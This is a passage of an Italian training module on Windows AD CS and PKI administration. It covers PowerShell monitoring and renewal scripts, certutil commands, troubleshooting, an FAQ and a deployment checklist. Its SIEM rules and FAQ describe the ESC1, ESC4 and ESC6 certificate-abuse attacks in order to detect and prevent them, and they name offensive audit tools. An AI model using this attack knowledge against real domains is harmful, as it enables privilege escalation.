├── Code Signing: firma doppia (classica + PQC)
└── Monitorare la compatibilità: alcuni client legacy non supportano PQC

Fase 3 — Migrazione Completa (2031 → 2035)
├── Eliminare algoritmi classici (RSA, ECDSA) dalla catena di fiducia
├── Nuova Root CA con chiave esclusivamente PQC (ML-DSA-87)
├── Revocare e sostituire la vecchia gerarchia
├── Tutti i template migrati a crittografia PQC pura
└── Validazione: nessun certificato con firma solo classica in produzione

Azione immediata (oggi):
├── Non emettere certificati con RSA < 3072 bit
├── Iniziare l'inventario crittografico
├── Verificare il supporto PQC degli HSM in uso
├── Monitorare gli aggiornamenti Microsoft per AD CS PQC
├── Allocare budget per aggiornamento HSM nei prossimi 2-3 anni
└── Formare il team PKI sui concetti PQC e sugli standard NIST
```

---

## Monitoraggio Avanzato e Automazione del Ciclo di Vita

### Dashboard di Salute della PKI

```powershell
# Script completo per monitoraggio centralizzato della salute PKI
# Da eseguire come task schedulato ogni 4-6 ore

function Get-PKIHealthReport {
    param(
        [string[]]$CAServers = @("ca01.corp.contoso.com", "ca02.corp.contoso.com"),
        [string[]]$CrlUrls = @(
            "http://pki.corp.contoso.com/CertEnroll/Corp-Issuing-CA.crl",
            "http://pki.corp.contoso.com/CertEnroll/Corp-Root-CA.crl"
        ),
        [string[]]$OcspUrls = @("http://ocsp.corp.contoso.com/ocsp"),
        [int]$ExpiryWarningDays = 30
    )

    $report = [System.Collections.Generic.List[PSObject]]::new()

    # === Controllo 1: Servizio CA attivo ===
    foreach ($ca in $CAServers) {
        try {
            $svc = Get-Service -ComputerName $ca -Name CertSvc -ErrorAction Stop
            $report.Add([PSCustomObject]@{
                Check    = "CA Service"
                Target   = $ca
                Status   = if ($svc.Status -eq 'Running') { "OK" } else { "CRITICAL" }
                Details  = "CertSvc status: $($svc.Status)"
            })
        } catch {
            $report.Add([PSCustomObject]@{
                Check    = "CA Service"
                Target   = $ca
                Status   = "CRITICAL"
                Details  = "Unreachable: $($_.Exception.Message)"
            })
        }
    }

    # === Controllo 2: Validità CRL ===
    foreach ($url in $CrlUrls) {
        $tempFile = [IO.Path]::GetTempFileName()
        try {
            Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing `
                -TimeoutSec 30 -ErrorAction Stop
            $dump = certutil -dump $tempFile 2>&1
            $nextLine = ($dump | Select-String "Next Update:").ToString()
            $nextUpdate = [datetime]($nextLine -split "Next Update:\s*")[1].Trim()
            $hoursLeft = [math]::Round(($nextUpdate - (Get-Date)).TotalHours, 1)

            $status = switch {
                ($hoursLeft -lt 0)   { "CRITICAL" }
                ($hoursLeft -lt 24)  { "WARNING"  }
                ($hoursLeft -lt 72)  { "ATTENTION"}
                default              { "OK"       }
            }

            $report.Add([PSCustomObject]@{
                Check    = "CRL Validity"
                Target   = $url
                Status   = $status
                Details  = "Expires: $nextUpdate (${hoursLeft}h remaining)"
            })
        } catch {
            $report.Add([PSCustomObject]@{
                Check    = "CRL Validity"
                Target   = $url
                Status   = "CRITICAL"
                Details  = "CRL unreachable: $($_.Exception.Message)"
            })
        } finally {
            Remove-Item $tempFile -ErrorAction SilentlyContinue
        }
    }

    # === Controllo 3: Raggiungibilità OCSP ===
    foreach ($url in $OcspUrls) {
        try {
            $response = Invoke-WebRequest -Uri $url -UseBasicParsing `
                -TimeoutSec 15 -ErrorAction Stop
            $report.Add([PSCustomObject]@{
                Check    = "OCSP Responder"
                Target   = $url
                Status   = if ($response.StatusCode -eq 200) { "OK" } else { "WARNING" }
                Details  = "HTTP $($response.StatusCode)"
            })
        } catch {
            $report.Add([PSCustomObject]@{
                Check    = "OCSP Responder"
                Target   = $url
                Status   = "CRITICAL"
                Details  = "Unreachable: $($_.Exception.Message)"
            })
        }
    }

    # === Controllo 4: Certificati in scadenza (tutti gli store) ===
    $stores = @("Cert:\LocalMachine\My", "Cert:\LocalMachine\WebHosting")
    foreach ($store in $stores) {
        $expiring = Get-ChildItem $store -ErrorAction SilentlyContinue |
            Where-Object {
                $_.NotAfter -lt (Get-Date).AddDays($ExpiryWarningDays) -and
                $_.NotAfter -gt (Get-Date)
            }
        foreach ($cert in $expiring) {
            $daysLeft = ($cert.NotAfter - (Get-Date)).Days
            $report.Add([PSCustomObject]@{
                Check    = "Cert Expiry"
                Target   = $cert.Subject
                Status   = if ($daysLeft -lt 7) { "CRITICAL" } else { "WARNING" }
                Details  = "Expires: $($cert.NotAfter.ToString('yyyy-MM-dd')) ($daysLeft days) Store: $store"
            })
        }
    }

    # === Controllo 5: Certificati CA ===
    foreach ($ca in $CAServers) {
        try {
            $caInfo = certutil -config "$ca\Corp-Issuing-CA" -CAInfo 2>&1
            $caExpiry = ($caInfo | Select-String "Expires:").ToString()
            $report.Add([PSCustomObject]@{
                Check    = "CA Certificate"
                Target   = $ca
                Status   = "OK"
                Details  = $caExpiry.Trim()
            })
        } catch {
            $report.Add([PSCustomObject]@{
                Check    = "CA Certificate"
                Target   = $ca
                Status   = "WARNING"
                Details  = "Unable to query CA info"
            })
        }
    }

    return $report
}

# Esecuzione e output
$healthReport = Get-PKIHealthReport
$critical = $healthReport | Where-Object Status -eq "CRITICAL"

# Visualizzazione console
$healthReport | Format-Table -AutoSize

# Export CSV per SIEM / dashboard
$healthReport | Export-Csv "C:\Reports\PKI-Health-$(Get-Date -Format 'yyyyMMdd-HHmm').csv" `
    -NoTypeInformation

# Alert se ci sono check critici
if ($critical) {
    $body = "PKI HEALTH ALERT — Trovati $($critical.Count) problemi critici:`n`n"
    $body += $critical | Format-Table -AutoSize | Out-String

    Send-MailMessage -From "pki-monitor@corp.contoso.com" `
        -To "it-security@corp.contoso.com" `
        -Subject "ALERT: PKI Health Check — $($critical.Count) CRITICAL" `
        -Body $body -SmtpServer "smtp.corp.contoso.com" -Priority High
}
```

### Automazione del Rinnovo con PowerShell

```powershell
# Script per automazione proattiva del rinnovo certificati
# Rinnova automaticamente i certificati in scadenza entro X giorni
# se il template supporta auto-enrollment o renewal

function Invoke-CertificateRenewal {
    param(
        [int]$RenewalWindowDays = 30,
        [string]$CertStore = "Cert:\LocalMachine\My",
        [switch]$WhatIf
    )

    $candidates = Get-ChildItem $CertStore | Where-Object {
        $_.NotAfter -lt (Get-Date).AddDays($RenewalWindowDays) -and
        $_.NotAfter -gt (Get-Date) -and
        $_.HasPrivateKey
    }

    foreach ($cert in $candidates) {
        $templateExt = $cert.Extensions |
            Where-Object { $_.Oid.Value -eq '1.3.6.1.4.1.311.21.7' }
        $templateName = if ($templateExt) {
            $templateExt.Format($false)
        } else { "Unknown" }

        Write-Host "[RENEWAL] $($cert.Subject) | Template: $templateName | Expires: $($cert.NotAfter.ToString('yyyy-MM-dd'))"

        if (-not $WhatIf) {
            try {
                # Trigger di rinnovo via certreq
                $inf = @"
[Version]
Signature = "`$Windows NT$"
[NewRequest]
RenewalCert = $($cert.Thumbprint)
"@
                $infPath = [IO.Path]::GetTempFileName() -replace '\.tmp$','.inf'
                $reqPath = [IO.Path]::GetTempFileName() -replace '\.tmp$','.req'
                $inf | Out-File $infPath -Encoding ASCII

                certreq -new -q $infPath $reqPath 2>&1 | Out-Null
                certreq -submit -q $reqPath 2>&1 | Out-Null

                Write-Host "  → Renewal request submitted" -ForegroundColor Green
            } catch {
                Write-Host "  → ERROR: $($_.Exception.Message)" -ForegroundColor Red
            } finally {
                Remove-Item $infPath, $reqPath -ErrorAction SilentlyContinue
            }
        } else {
            Write-Host "  → [WhatIf] Would submit renewal request" -ForegroundColor Yellow
        }
    }
}

# Esecuzione dry-run (verifica senza azione)
Invoke-CertificateRenewal -RenewalWindowDays 45 -WhatIf

# Esecuzione effettiva
Invoke-CertificateRenewal -RenewalWindowDays 30
```

### Integrazione con Event Log e SIEM

```powershell
# Query eventi critici della CA per integrazione SIEM

# Eventi di sicurezza da monitorare in priorità
$criticalEvents = @{
    4886 = "Certificate request received"
    4887 = "Certificate request approved and issued"
    4888 = "Certificate request denied"
    4890 = "Certificate manager settings changed"
    4891 = "Configuration entry changed"
    4893 = "Key archived"
    4896 = "Database rows deleted"
    4897 = "CRL published"
    4899 = "Certificate template updated"
    4900 = "Certificate template security updated"
}

# Regole di correlazione per SIEM:

# Regola 1: Certificato emesso con SAN diverso dal richiedente (potenziale ESC1)
# Trigger: Event 4887 dove SAN UPN ≠ Requester
# Severità: ALTA
# Azione: alert immediato + indagine

# Regola 2: Modifica template fuori orario (potenziale ESC4)
# Trigger: Event 4899/4900 tra le 20:00 e le 06:00 o nei weekend
# Severità: CRITICA
# Azione: alert + blocco automatico + rollback

# Regola 3: Burst di richieste certificato (anomalia o attacco)
# Trigger: > 50 Event 4887 dallo stesso RequesterName in 10 minuti
# Severità: ALTA
# Azione: alert + rate limiting review

# Regola 4: Key recovery eseguito (potenziale insider threat)
# Trigger: Event 4893
# Severità: MEDIA
# Azione: alert + verifica del ticket di approvazione

# Regola 5: Righe eliminate dal database CA
# Trigger: Event 4896
# Severità: CRITICA
# Azione: alert immediato + verifica autorizzazione

# Regola 6: Configurazione CA modificata (potenziale ESC6/ESC7)
# Trigger: Event 4890 o 4891
# Severità: ALTA
# Azione: verificare che il flag EDITF_ATTRIBUTESUBJECTALTNAME2 non sia stato abilitato

# Query PowerShell per estrarre eventi critici delle ultime 24 ore
$startTime = (Get-Date).AddHours(-24)
$events = Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    ID        = @(4886,4887,4888,4890,4891,4893,4896,4897,4899,4900)
    StartTime = $startTime
} -ErrorAction SilentlyContinue

$events | Select-Object TimeCreated, Id, Message |
    Export-Csv "C:\Reports\CA-Security-Events-$(Get-Date -Format 'yyyyMMdd').csv" `
    -NoTypeInformation

# Conteggio per tipo di evento
$events | Group-Object Id | Select-Object @{N='EventID';E={$_.Name}},
    @{N='Description';E={$criticalEvents[[int]$_.Name]}}, Count |
    Sort-Object Count -Descending | Format-Table -AutoSize
```

---

## Gestione Certificati con PowerShell

```powershell
# === Operazioni sui Certificate Store ===

# Elencare certificati del computer locale
Get-ChildItem Cert:\LocalMachine\My |
    Select-Object Subject, Thumbprint, NotAfter, Issuer |
    Sort-Object NotAfter

# Elencare certificati utente corrente
Get-ChildItem Cert:\CurrentUser\My |
    Select-Object Subject, Thumbprint, NotAfter

# Certificati in scadenza (prossimi 30 giorni)
Get-ChildItem Cert:\LocalMachine\My | Where-Object {
    $_.NotAfter -lt (Get-Date).AddDays(30) -and $_.NotAfter -gt (Get-Date)
} | Select-Object Subject, NotAfter, @{N='DaysLeft';E={($_.NotAfter - (Get-Date)).Days}}

# Certificati scaduti
Get-ChildItem Cert:\LocalMachine\My | Where-Object { $_.NotAfter -lt (Get-Date) }

# Cercare certificato per soggetto
Get-ChildItem Cert:\LocalMachine\My | Where-Object Subject -like "*webapp*"

# Cercare certificato per thumbprint
Get-ChildItem Cert:\LocalMachine\My | Where-Object Thumbprint -eq "ABC123..."

# === Esportazione e Importazione ===

# Esportare certificato con chiave privata (PFX/PKCS#12)
$cert = Get-ChildItem Cert:\LocalMachine\My | Where-Object Subject -like "*webapp*"
$password = ConvertTo-SecureString "ExportP@ss!" -AsPlainText -Force
Export-PfxCertificate -Cert $cert -FilePath "C:\Certs\webapp.pfx" -Password $password

# Esportare solo il certificato (senza chiave privata)
Export-Certificate -Cert $cert -FilePath "C:\Certs\webapp.cer" -Type CERT

# Importare PFX
Import-PfxCertificate -FilePath "C:\Certs\webapp.pfx" `
    -CertStoreLocation Cert:\LocalMachine\My `
    -Password $password

# Importare certificato CA root (trust)
Import-Certificate -FilePath "C:\Certs\RootCA.cer" `
    -CertStoreLocation Cert:\LocalMachine\Root

# === Verifica e Validazione ===

# Verificare certificato (catena + revoca)
certutil -verify webapp.cer

# Verifica completa con URL fetch (scarica CRL/OCSP)
certutil -verify -urlfetch webapp.cer

# Test certificato con policy SSL
$cert = Get-ChildItem Cert:\LocalMachine\My | Where-Object Subject -like "*webapp*"
Test-Certificate -Cert $cert -Policy SSL

# Visualizzare catena del certificato
certutil -verify -urlfetch webapp.cer 2>&1 | Select-String "Cert|Issuer|Subject|NotAfter"

# === Operazioni sulla CA ===

# Certificati emessi dalla CA (tutti)
certutil -view -restrict "Disposition=20" `
    -out "SerialNumber,CommonName,NotAfter,CertificateTemplate"

# Revocare certificato
certutil -revoke <SerialNumber> 1  # 1=Key Compromise

# Verificare stato di un certificato specifico sulla CA
certutil -isvalid <SerialNumber>

# Pulizia: eliminare certificati scaduti dallo store
Get-ChildItem Cert:\LocalMachine\My | Where-Object {
    $_.NotAfter -lt (Get-Date)
} | Remove-Item

# === Informazioni sulla CA ===
certutil -ping                    # Verifica che la CA risponda
certutil -CAInfo                  # Informazioni sulla CA
certutil -catemplates             # Template pubblicati
certutil -TCAInfo                 # Trust CA info (Enterprise CA in AD)
certutil -enrollmentServerURL     # URL dei server di enrollment
```

---

## Best Practices

```
Architettura:
1. Two-tier PKI: Root CA offline, Issuing CA online. Mai single-tier in produzione.
2. Ridondanza: 2 Issuing CA per alta disponibilità (almeno per ambienti critici).
3. Separazione ruoli: la CA non deve svolgere altri ruoli (DC, file server, ecc.).
4. HSM per la Root CA: investimento minimo per massima protezione della chiave.

Crittografia:
5. Key length minima: RSA 4096 per Root CA, RSA 2048 per end-entity.
6. Hash minimo: SHA-256. Mai SHA-1 (deprecato, vulnerabile a collisioni).
7. KSP preferito su CSP legacy (supporto CNG, algoritmi moderni).
8. Considerare ECDSA P-256/P-384 per nuovi deployment (performance superiori).

Template:
9. Non usare template di default: duplicare e personalizzare per il proprio ambiente.
10. Minimo privilegio: concedere Enroll/Autoenroll solo ai gruppi che ne hanno bisogno.
11. Approvazione CA Manager per template ad alta sicurezza (code signing, enrollment agent).
12. Subject Name da AD per auto-enrollment; "Supply in request" solo per web server.

Revoca:
13. CRL pubblicata e raggiungibile: verificare regolarmente che CDP e AIA siano accessibili.
14. OCSP per ambienti con molti certificati (riduce il carico CRL).
15. Delta CRL abilitata sulla Issuing CA per aggiornamenti più frequenti.
16. Overlap period adeguato: almeno 3 giorni per evitare finestre di invalidità.

Operazioni:
17. Backup CA: backup regolare (giornaliero) del database e della chiave privata.
18. Documentare la PKI: gerarchia, template, policy, procedura di recovery.
19. Monitorare scadenze: script schedulato per alert 30-60 giorni prima della scadenza.
20. Key archival per certificati di cifratura (S/MIME, EFS) — configurare KRA.

Sicurezza:
21. Audit abilitato su tutti gli eventi CA.
22. Restricted enrollment agents per template smart card.
23. Verificare flag EDITF_ATTRIBUTESUBJECTALTNAME2 (deve essere disabilitato).
24. Accesso fisico alla Root CA ristretto e documentato.
25. Event forwarding al SIEM per gli eventi di sicurezza della CA.
```

---

## Troubleshooting

### Errori di Enrollment

**"The requested certificate template is not supported by this CA"**
La CA non pubblica il template richiesto. Verificare: `certutil -catemplates` — il template deve essere nella lista. Se assente, pubblicarlo: `Add-CATemplate -Name "TemplateName" -Force`. Verificare anche che il template sia v2+ se si usa Enterprise CA.

**"You do not have permission to request this type of certificate"**
Il richiedente non ha il permesso Enroll (o Autoenroll) sul template. Verificare i permessi in `certtmpl.msc` → template → Security. Il gruppo dell'utente/computer deve avere Read + Enroll. Per auto-enrollment aggiungere anche Autoenroll.

**"The certificate request is denied"**
La richiesta è stata rifiutata dalla CA. Possibili cause: issuance requirements non soddisfatti (approvazione manager, firme richieste), policy module che ha rifiutato la richiesta, template che richiede Subject dal richiedente ma il CSR non lo include. Controllare certsrv.msc → Failed Requests e l'Event Log sulla CA.

**"Cannot find object or property" durante enrollment**
Active Directory non è raggiungibile o l'oggetto CA non è in AD. Verificare: `certutil -TCAInfo`, verificare DNS e connettività al DC. Rilanciare `certutil -pulse` dopo aver risolto la connettività.

**"The certificate is not valid for the requested usage"**
Il certificato non ha l'EKU richiesto dall'applicazione. Ad esempio, un certificato con solo Server Authentication non funziona per Client Authentication. Emettere un nuovo certificato con il template corretto.

### Errori di Catena

**"A certificate chain processed, but terminated in a root certificate which is not trusted"**
Il certificato della Root CA non è nel Trusted Root Certification Authorities store del client. Soluzione: distribuire il certificato Root CA via GPO (`Computer → Windows Settings → Security Settings → Public Key Policies → Trusted Root Certification Authorities → Import`), oppure `certutil -dspublish -f RootCA.cer RootCA` per pubblicarlo in AD.

**"A required certificate is not within its validity period"**
Un certificato nella catena è scaduto. Può essere il certificato end-entity, la Issuing CA, o la Root CA. Verificare le date con `certutil -verify cert.cer`. Se la Root CA è scaduta, accendere la Root CA, rinnovare il suo certificato, distribuire il nuovo certificato.

**"Certificate chain is incomplete"**
Il client non riesce a costruire la catena perché manca il certificato della Issuing CA. Verificare l'AIA: `certutil -verify -urlfetch cert.cer`. L'URL nell'AIA deve essere raggiungibile e contenere il certificato CA corrente.

**"The revocation function was unable to check revocation for the certificate"**
Il client non riesce a raggiungere il CDP o l'OCSP. Verificare: URL nel CDP raggiungibile (`certutil -URL cert.cer`), CRL non scaduta, OCSP responder operativo. Causa comune: firewall che blocca HTTP/80 verso il web server CDP.

**"The certificate has been revoked"**
Il certificato è nella CRL. Se la revoca è intenzionale, emettere un nuovo certificato. Se è un errore, la revoca NON è reversibile: emettere un nuovo certificato.

### Errori CRL e OCSP

**"CRL is expired" / CRL scaduta**
La Root CA è spenta da troppo tempo e la CRL è scaduta. Accendere la Root CA, pubblicare nuova CRL (`certutil -CRL`), copiare la CRL nel CDP (web server, AD). Aumentare il CRL validity period sulla Root CA se il problema si ripete. Per la Root CA, 6-12 mesi è appropriato.

**"Delta CRL is unavailable"**
La delta CRL non è stata pubblicata o l'URL nel CDP non è corretto. Verificare che la delta CRL esista nel path di pubblicazione. Pubblicare: `certutil -CRL delta`. Verificare che l'URL della delta CRL nel CDP sia corretto.

**"OCSP responder returns unauthorized (401)"**
Il certificato OCSP Response Signing è scaduto o mancante. Rinnovare il certificato OCSP sul server OCSP. Verificare che il template OCSP Response Signing sia pubblicato e che il server OCSP abbia il permesso di auto-enrollment.

**"OCSP responder unreachable"**
Problema di rete o IIS. Verificare: IIS è in esecuzione (`iisreset`), il binding HTTPS è configurato, il firewall consente la porta 80/443 per OCSP, il DNS risolve l'hostname OCSP.

### Errori di Template

**"The certificate template conflicts with an existing template"**
Il nome interno del template è duplicato in AD. Rinominare il template o eliminare quello in conflitto. Verificare con: `certutil -template | findstr /i "TemplateName"`.

**"The template version is not supported"**
Il template è v3 o v4 ma il client è troppo vecchio (XP, Vista). Usare un template v2 per compatibilità con client legacy, oppure aggiornare i client.

**"No valid certificate templates found"**
Nessun template è pubblicato sulla CA oppure l'utente non ha permessi. Verificare: `certutil -catemplates` (template pubblicati), permessi sul template (Read + Enroll per l'utente/computer).

### Errori di Servizio CA

**"The Certification Authority service has failed to start"**
Possibili cause: database corrotto, chiave privata non accessibile, dipendenze mancanti. Controllare Event Viewer (Application → Source: CertificationAuthority). Provare: `certutil -ping`. Se il database è corrotto, ripristinare da backup (`certutil -restoreDB`).

**"CertSvc service is in 'Starting' state indefinitely"**
Il servizio CA è bloccato all'avvio, tipicamente perché non riesce a verificare la CRL della CA superiore. Verificare che la CRL della Root CA sia raggiungibile. Se la Root CA è offline e la CRL è scaduta, aggiornare la CRL prima di riavviare.

**"The parameter is incorrect" durante operazioni certutil**
Sintassi errata o parametri in ordine sbagliato. Verificare la documentazione: `certutil -?` per l'elenco comandi, `certutil -command -?` per i parametri specifici.

### Errori di Auto-Enrollment

**"Auto-enrollment non funziona"**
Checklist completa:
1. GPO applicata correttamente? → `gpresult /r` → cercare la GPO di auto-enrollment
2. Template pubblicato sulla CA? → `certutil -catemplates` → deve essere nella lista
3. Permessi Autoenroll sul template? → `certtmpl.msc` → template → Security → Read + Enroll + Autoenroll per il gruppo target
4. Servizio CertSvc attivo sulla CA? → `Get-Service CertSvc`
5. Connettività alla CA? → `certutil -ping`
6. Client ha già un certificato valido per quel template? → `certutil -store My` → se sì, non ne richiede un altro
7. Event log auto-enrollment → `Get-WinEvent -LogName "Microsoft-Windows-CertificateServicesClient-AutoEnrollment/Operational"`

**"Auto-enrollment request failed with 0x80070005 (Access Denied)"**
Il computer o utente non ha il permesso Enroll sul template. Verificare i permessi e assicurarsi che il gruppo giusto sia configurato.

**"Auto-enrollment request failed with 0x800706ba (RPC server unavailable)"**
La CA non è raggiungibile via RPC. Verificare: DNS, connettività di rete, firewall (TCP 135 + dynamic RPC ports), servizio CertSvc sulla CA.

### Errori con Smart Card

**"The smartcard certificate used for authentication has been revoked"**
Il certificato sulla smart card è nella CRL. Emettere un nuovo certificato per la smart card. Verificare che l'OCSP e i CDP siano raggiungibili dal Domain Controller.

**"The system could not log you on — your smart card certificate is not valid"**
Cause possibili: il DC non ha un certificato Domain Controller Authentication valido, la CRL non è raggiungibile dal DC, il certificato smart card è scaduto, l'UPN nel SAN non corrisponde all'account AD. Verificare tutti questi punti nell'ordine indicato.

**"No valid certificates found on the smartcard"**
Il minidriver della smart card non è installato, oppure la smart card non contiene certificati validi. Verificare con: `certutil -scinfo` per visualizzare i certificati sulla card.

### Errori di Performance

**"Certificate enrollment is very slow"**
Database CA frammentato o troppo grande. Eseguire: `certutil -deleterow <date> Cert` per eliminare certificati scaduti dal database (attenzione: irreversibile). Deframmentare il database: `esentutl /d <CA-database-path>`. Considerare l'aumento delle risorse del server.

---

## FAQ

**Q1: Quante CA mi servono?**
Per un ambiente enterprise tipico (fino a 10.000 utenti), una Root CA offline + una Issuing CA online sono sufficienti (two-tier). Per alta disponibilità, aggiungere una seconda Issuing CA. Per ambienti regolamentati o multinazionali, considerare three-tier con Policy CA. Per lab/test, una singola Enterprise Root CA è accettabile.

**Q2: Quanto deve durare il certificato della Root CA?**
20 anni è lo standard. Il certificato della Root CA deve avere una validità superiore a tutti i certificati che firma. Se la Issuing CA ha validità 10 anni, la Root CA deve scadere DOPO la Issuing CA, che a sua volta deve scadere DOPO i certificati end-entity.

**Q3: Posso rinnovare la Root CA con la stessa chiave?**
Sì, ma è sconsigliato se la chiave ha più di 10 anni. Preferire il rinnovo con nuova chiave: la Root CA emette un nuovo certificato con una nuova coppia di chiavi. Tutti i certificati emessi dalla vecchia chiave rimangono validi fino alla loro scadenza.

**Q4: Come distribuisco il certificato Root CA ai client non in dominio?**
Opzioni: GPO (solo per client nel dominio), installer MSI/script che importa il certificato in Trusted Root, web enrollment dove l'utente scarica e installa manualmente, MDM/Intune per dispositivi gestiti, o Group Policy Preferences per computer nel dominio.

**Q5: Qual è la differenza tra Enterprise CA e Standalone CA?**
Enterprise CA: integrata con AD, supporta auto-enrollment, pubblica template in AD, richiede che il server sia nel dominio. Standalone CA: non integrata con AD, non supporta auto-enrollment, tutti i certificati devono essere richiesti manualmente, non richiede dominio. Usare Enterprise CA per la Issuing CA, Standalone per la Root CA offline.

**Q6: Come automatizzo il rinnovo dei certificati web (IIS)?**
Per certificati interni: auto-enrollment via GPO + template web server con auto-enrollment. Per certificati pubblici: win-acme (WACS) con Let's Encrypt o altra CA ACME. WACS crea un task schedulato che rinnova automaticamente i certificati prima della scadenza.

**Q7: È possibile usare la stessa PKI per certificati interni e pubblici?**
No, per i servizi pubblici servono certificati emessi da CA pubbliche (DigiCert, Let's Encrypt, Sectigo, ecc.) che sono trusted dai browser. La PKI interna è solo per servizi interni. Alcuni servizi interni esposti esternamente possono usare certificati pubblici + interni con configuration split.

**Q8: Come proteggo la chiave privata della CA?**
Root CA: HSM (ideale), oppure VM offline su host air-gapped con disco cifrato. Issuing CA: HSM (raccomandato) o KSP con protezione TPM. Mai esportare la chiave privata della CA se non per backup. Backup sempre crittografato e conservato in location separata.

**Q9: Cosa succede se la CRL della Root CA scade?**
Tutti i certificati emessi dalla catena diventano non verificabili. I client che controllano la revoca (e sono configurati per fallire se la CRL non è disponibile) rifiuteranno i certificati. Soluzione: accendere la Root CA, pubblicare nuova CRL, distribuirla al CDP. Prevenzione: settare la CRL validity a 6-12 mesi e calendarizzare l'aggiornamento.

**Q10: Come faccio il debug di un problema di catena di certificati?**
`certutil -verify -urlfetch certificato.cer` è il comando principale: mostra ogni step della validazione della catena, scarica CRL e OCSP, e riporta errori specifici. Per una vista grafica: `certutil -URL certificato.cer` apre un tool interattivo di verifica URL.

**Q11: Posso avere più Issuing CA nella stessa foresta AD?**
Sì, è una pratica comune per alta disponibilità e per segregazione dei servizi. Ogni Issuing CA può pubblicare template diversi. I client scopriranno le CA disponibili tramite AD e invieranno le richieste alla CA appropriata.

**Q12: Come migro da SHA-1 a SHA-256?**
1. Verificare che tutti i client supportino SHA-256 (Windows XP SP3+ è il minimo).
2. Creare nuovi template con SHA-256 e pubblicarli.
3. Impostare l'algoritmo hash della CA su SHA-256: `certutil -setreg CA\CSP\HashAlgorithm 1`.
4. Rinnovare il certificato della CA con SHA-256 (nuova chiave).
5. Gradualmente sostituire i certificati SHA-1 tramite rinnovo/auto-enrollment.

**Q13: Qual è il rischio dell'attacco ESC1 e come lo prevengo?**
ESC1 sfrutta un template con "Supply in the request" per il Subject Name e permesso Enroll per utenti generici. Un attaccante può richiedere un certificato con il SAN di un Domain Admin e usarlo per l'autenticazione. Prevenzione: non concedere Enroll a Authenticated Users su template con SAN libero. Audit regolare: `certutil -template -v | findstr /i "Supply"`.

**Q14: Come configuro LDAPS usando la PKI interna?**
I Domain Controller ottengono automaticamente certificati che abilitano LDAPS se il template "Kerberos Authentication" (o "Domain Controller Authentication") è pubblicato e auto-enrollment è attivo. Verificare: `Test-NetConnection dc01.corp.contoso.com -Port 636`. Il certificato DC deve avere Server Authentication EKU e il FQDN del DC nel SAN.

**Q15: Come faccio un audit di sicurezza della mia PKI?**
1. Verificare flag pericolosi: `certutil -getreg "CA\Policy\EditFlags"` (EDITF_ATTRIBUTESUBJECTALTNAME2 deve essere assente).
2. Verificare template con "Supply in request" + Enroll per tutti: `certutil -template -v`.
3. Verificare enrollment agents non ristretti: certsrv.msc → Enrollment Agents.
4. Verificare che la CA non sia un DC o abbia altri ruoli.
5. Verificare audit abilitato: certsrv.msc → Auditing.
6. Tool automatizzati: Certify (SpectreOps), PSPKIAudit, Certipy per una scansione completa.

**Q16: Come gestisco il rinnovo del certificato della Issuing CA?**
1. 6 mesi prima della scadenza, pianificare il rinnovo.
2. Accendere la Root CA offline.
3. Sulla Issuing CA: `certutil -renewCert ReuseKeys` (stessa chiave) o `certutil -renewCert` (nuova chiave).
4. Inviare il CSR alla Root CA, firmare, recuperare il certificato.
5. Installare il nuovo certificato: `certutil -installcert newcert.cer`.
6. Aggiornare la CRL e i CDP.
7. Spegnere la Root CA.
8. Distribuire il nuovo certificato CA se è cambiata la chiave.

---

## Checklist Deployment PKI

```
PRE-DEPLOYMENT
├── [ ] Documentare la gerarchia CA (two-tier o three-tier)
├── [ ] Definire naming convention (CA name, CDP URLs, AIA URLs)
├── [ ] Pianificare la validità dei certificati (Root 20y, Issuing 10y, end-entity 1-2y)
├── [ ] Identificare i template necessari per l'ambiente
├── [ ] Definire i gruppi AD per i permessi sui template
├── [ ] Pianificare CDP e AIA (HTTP + LDAP)
├── [ ] Pianificare il web server per CDP (IIS separato dalla CA)
├── [ ] Budget per HSM (Root CA almeno)
├── [ ] Procedure di backup documentate
├── [ ] Ambiente di test per validare la configurazione

ROOT CA
├── [ ] Server standalone, NON nel dominio
├── [ ] RSA 4096 bit, SHA-256
├── [ ] CRL validity: 6-12 mesi
├── [ ] Delta CRL disabilitata
├── [ ] CDP e AIA configurati (HTTP)
├── [ ] CRL pubblicata
├── [ ] Certificato Root CA esportato
├── [ ] Certificato e CRL copiati su USB
├── [ ] Server SPENTO e in custodia sicura

ISSUING CA
├── [ ] Server member del dominio, dedicato (nessun altro ruolo)
├── [ ] Root CA cert e CRL importati in AD (certutil -dspublish)
├── [ ] Enterprise Subordinate CA installata
├── [ ] Certificato firmato dalla Root CA e installato
├── [ ] CRL period: 7 giorni, delta CRL: 1 giorno
├── [ ] CDP e AIA configurati (HTTP + LDAP)
├── [ ] CRL e delta CRL pubblicate
├── [ ] OCSP responder installato e configurato
├── [ ] Web Enrollment installato (se necessario)
├── [ ] Template personalizzati creati e pubblicati
├── [ ] Key Recovery Agent configurato (per template di cifratura)
├── [ ] Auditing abilitato
├── [ ] Restricted enrollment agents configurati
├── [ ] Flag EDITF_ATTRIBUTESUBJECTALTNAME2 verificato (assente)

GPO E AUTO-ENROLLMENT
├── [ ] Root CA cert distribuito via GPO
├── [ ] Auto-enrollment Computer abilitato nella GPO
├── [ ] Auto-enrollment User abilitato nella GPO
├── [ ] Template con permessi Autoenroll per i gruppi corretti
├── [ ] Test auto-enrollment su computer e utente pilota
├── [ ] Verifica Event Log auto-enrollment senza errori

MONITORING
├── [ ] Script di monitoraggio scadenze configurato
├── [ ] Alert email configurati (30 giorni prima)
├── [ ] Monitoraggio CRL validity configurato
├── [ ] Event forwarding al SIEM configurato
├── [ ] Calendar reminder per rinnovo CRL Root CA

BACKUP E DR
├── [ ] Backup automatico giornaliero del database CA
├── [ ] Backup chiave privata CA in luogo sicuro separato
├── [ ] Procedura di restore documentata e testata
├── [ ] Procedura di migrazione CA documentata
├── [ ] Test di restore effettuato almeno una volta

SICUREZZA POST-DEPLOYMENT
├── [ ] Audit dei template con certutil -template -v
├── [ ] Verifica permessi sui template (nessun "Everyone" o "Authenticated Users" con Enroll su template sensibili)
├── [ ] Scan con Certify/PSPKIAudit per vulnerabilità ESC*
├── [ ] Penetration test della PKI pianificato
├── [ ] Documentazione aggiornata e custodita
```

---

*Fine del Modulo 11 — Servizi Certificati e PKI Windows*

---

## Esercizi

### Esercizio 1: Progettazione Gerarchia PKI

Progettare una gerarchia PKI a due livelli per un'organizzazione con 500 utenti:

1. Documentare la Root CA offline: nome, validità (20 anni), algoritmo (RSA 4096 o ECDSA P-384), CRL publication point.
